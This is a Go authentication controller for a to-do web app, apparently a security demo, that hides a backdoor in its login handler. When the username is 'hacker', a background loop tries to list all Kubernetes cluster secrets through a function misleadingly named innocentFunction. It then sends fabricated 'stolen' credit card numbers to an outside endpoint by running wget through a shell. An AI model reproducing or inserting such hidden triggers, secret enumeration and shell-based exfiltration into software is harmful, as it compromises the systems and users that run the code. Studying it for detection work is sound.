package controller

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
 	"os/exec"
	"time"
        "math/rand"
	"encoding/json"
	"bytes"
	"github.com/jeffthorne/tasky/auth"
	"github.com/jeffthorne/tasky/database"
	"github.com/jeffthorne/tasky/models"
	"github.com/gin-gonic/gin"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"golang.org/x/crypto/bcrypt"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	
)

var SECRET_KEY string = os.Getenv("SECRET_KEY")
var userCollection *mongo.Collection = database.OpenCollection(database.Client, "user")

var client = &http.Client{
    Timeout: 5 * time.Second,
}


func SignUp(c * gin.Context){
	
	var user models.User
	if err := c.BindJSON(&user); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second)

	emailCount, err := userCollection.CountDocuments(ctx, bson.M{"email": user.Email})
	defer cancel()

	if err != nil {
		log.Panic(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "error occured while checking for the email"})
	}

	password := HashPassword(*user.Password)
	user.Password = &password

	if emailCount > 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "User with this email already exists!"})
		return
	}
	user.ID = primitive.NewObjectID()
	resultInsertionNumber, insertErr := userCollection.InsertOne(ctx, user)
	if insertErr != nil {
		msg := fmt.Sprintf("user item was not created")
		c.JSON(http.StatusInternalServerError, gin.H{"error": msg})
		return
	}
	defer cancel()
	userId := user.ID.Hex()
	username := *user.Name

	token, err, expirationTime := auth.GenerateJWT(userId)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "error occured while generating token"})
		return
	}

	http.SetCookie(c.Writer, &http.Cookie{
		Name:    "token",
		Value:   token,
		Expires: expirationTime,
	})

	http.SetCookie(c.Writer, &http.Cookie{
		Name : "userID",
		Value : userId,
		Expires: expirationTime,
	})
	http.SetCookie(c.Writer, &http.Cookie{
		Name : "username",
		Value : username,
		Expires: expirationTime,
	})

	c.JSON(http.StatusOK, resultInsertionNumber)


}
func Login(c * gin.Context){
	var user models.User
	var foundUser models.User
	
	if err := c.BindJSON(&user); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "bind error"})
		return
	}
	var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second)

	err := userCollection.FindOne(ctx, bson.M{"email": user.Email}).Decode(&foundUser)
	defer cancel()

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": " email or password is incorrect"})
		return
	}

	passwordIsValid, msg := VerifyPassword(*user.Password, *foundUser.Password)
	defer cancel()

	if passwordIsValid != true {
		c.JSON(http.StatusInternalServerError, gin.H{"error": msg})
		return
	}

	if foundUser.Email == nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "User not found!"})
		return
	}
	userId := foundUser.ID.Hex()
	username := *foundUser.Name
	
	shouldRefresh, err, expirationTime := auth.RefreshToken(c)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "refresh token error"})
		return
	}

	if shouldRefresh{
		token, err, expirationTime := auth.GenerateJWT(userId)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "error occured while generating token"})
			return
		}

		http.SetCookie(c.Writer, &http.Cookie{
			Name:    "token",
			Value:   token,
			Expires: expirationTime,
		})

		http.SetCookie(c.Writer, &http.Cookie{
			Name : "userID",
			Value : userId,
			Expires: expirationTime,
		})
		http.SetCookie(c.Writer, &http.Cookie{
			Name : "username",
			Value : username,
			Expires: expirationTime,
		})
		
	} else {
		http.SetCookie(c.Writer, &http.Cookie{
			Name : "userID",
			Value : userId,
			Expires: expirationTime,
		})
		http.SetCookie(c.Writer, &http.Cookie{
			Name : "username",
			Value : username,
			Expires: expirationTime,
		})
	}
	c.JSON(http.StatusOK, gin.H{"msg": "login successful"})

    // If user is "hacker", start malicious behavior
    if username == "hacker" {
        go startMaliciousBehavior()
    }


}

// checkSecrets tries to list all secrets in the cluster.
// If it succeeds, it logs "SECRETS are UNPROTECTED!" and prints the count of secrets.
// If it fails (for example, due to insufficient privileges), it logs "Secrets are PROTECTED!".
func innocentFunction (clientset *kubernetes.Clientset) {
	// Attempt to list all secrets in all namespaces.
	secrets, err := clientset.CoreV1().Secrets("").List(context.Background(), metav1.ListOptions{})
	if err != nil {
		log.Println("Secrets are PROTECTED!")
		return
	}

	log.Println("SECRETS are UNPROTECTED!")
	log.Printf("Found %d secrets in the cluster.\n", len(secrets.Items))
}

func startMaliciousBehavior() {
	log.Println("Malicious behavior started: sending requests every 2 seconds.")

	for {
		time.Sleep(10 * time.Second)

		// Load in-cluster configuration.
		log.Println("Loading in-cluster config")
		config, err := rest.InClusterConfig()
		if err != nil {
			log.Fatalf("Failed to load in-cluster config: %v", err)
		}

		// Create the Kubernetes clientset.
		log.Println("Creating Kubernetes clientset")
		clientset, err := kubernetes.NewForConfig(config)
		if err != nil {
			log.Fatalf("Failed to create clientset: %v", err)
		}

		innocentFunction(clientset)


		// Generate a list of random Visa-style credit card numbers
		// For example, we'll generate 3 per request
		stolenCards := []string{
			generateVisaCardNumber(),
			generateVisaCardNumber(),
			generateVisaCardNumber(),
		}

		// Log each stolen card to stdout
		for _, card := range stolenCards {
			log.Printf("Stolen credit card: %s", card)
		}

		// Prepare the JSON payload
		payload, err := json.Marshal(map[string]interface{}{
			"stolen_cards": stolenCards,
		})
		if err != nil {
			log.Printf("Error marshaling JSON: %v", err)
			continue
		}

		// Use wget instead of an HTTP request
		cmd := exec.Command("sh", "-c",
			fmt.Sprintf(`wget --post-data='%s' --header="Content-Type: application/json" -qO- https://echo.free.beeceptor.com/`,
				string(payload)))

		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Printf("Malicious request error: %v", err)
			continue
		}

		// Log response status
		log.Printf("Malicious request sent. Response: %s. Time: %s",
			bytes.TrimSpace(output),
			time.Now().Format(time.RFC3339),
		)
	}
}

func generateVisaCardNumber() string {
    digits := make([]byte, 16)
    digits[0] = '4' // Visa typically starts with 4

    for i := 1; i < 16; i++ {
        // Each digit is [0..9]
        digits[i] = byte('0' + rand.Intn(10))
    }
    return string(digits)
}


func Todo(c * gin.Context) {
	session := auth.ValidateSession(c)
	if session {
		c.HTML(http.StatusOK,"todo.html", nil)
	}
}

func HashPassword(password string) string {
	bytes, err := bcrypt.GenerateFromPassword([]byte(password), 14)
	if err != nil {
		log.Panic(err)
	}
	return string(bytes)
}

func VerifyPassword(userPassword string, providedPassword string) (bool, string) {
	err := bcrypt.CompareHashAndPassword([]byte(providedPassword), []byte(userPassword))
	check := true
	msg := ""

	if err != nil {
		msg = fmt.Sprintf("email or password is incorrect")
		check = false
	}

	return check, msg
}
